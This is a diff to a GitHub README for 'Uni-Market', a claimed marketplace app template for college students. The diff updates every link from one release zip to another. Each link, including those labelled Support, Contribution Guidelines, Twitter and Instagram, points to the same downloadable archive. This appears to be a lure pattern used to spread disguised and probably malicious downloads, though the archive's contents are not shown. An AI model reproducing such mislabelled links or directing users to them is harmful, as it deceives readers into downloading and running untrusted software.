@@ -30,11 +30,11 @@ Uni-Market is a marketplace app template designed specifically for college stude
 
 ### Get Started 🚀
 
-To access the Uni-Market software package, [click here](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip).
+To access the Uni-Market software package, [click here](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip).
 
-[![Download Software](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip)](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip)](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip)
 
-If the link does not load the file directly, kindly visit our [Releases](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip) section for alternative downloads.
+If the link does not load the file directly, kindly visit our [Releases](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip) section for alternative downloads.
 
 ### Installation Instructions 🛠️
 
@@ -46,18 +46,18 @@ If the link does not load the file directly, kindly visit our [Releases](https:/
 
 ### Support 🤝
 
-If you encounter any issues or have any questions, feel free to reach out to us on [GitHub](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip).
+If you encounter any issues or have any questions, feel free to reach out to us on [GitHub](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip).
 
 ### Contribution Guidelines 🤓
 
-We welcome any contributions to enhance Uni-Market! Please refer to our [Contribution Guidelines](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip) before submitting pull requests.
+We welcome any contributions to enhance Uni-Market! Please refer to our [Contribution Guidelines](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip) before submitting pull requests.
 
 ### Stay Connected 🌐
 
-Stay up to date with Uni-Market by following us on [Twitter](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip) and [Instagram](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip).
+Stay up to date with Uni-Market by following us on [Twitter](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip) and [Instagram](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip).
 
 Thank you for choosing Uni-Market! Happy buying and selling within your college community! 🎉📦📚
 
 ---
 
-*This https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip template was created by the Cool READMEs project. Learn more [here](https://github.com/souwie/uni-market/releases/download/v1.0/Program.zip).*
+*This https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip template was created by the Cool READMEs project. Learn more [here](https://github.com/souwie/uni-market/releases/download/v2.0/Software.zip).*
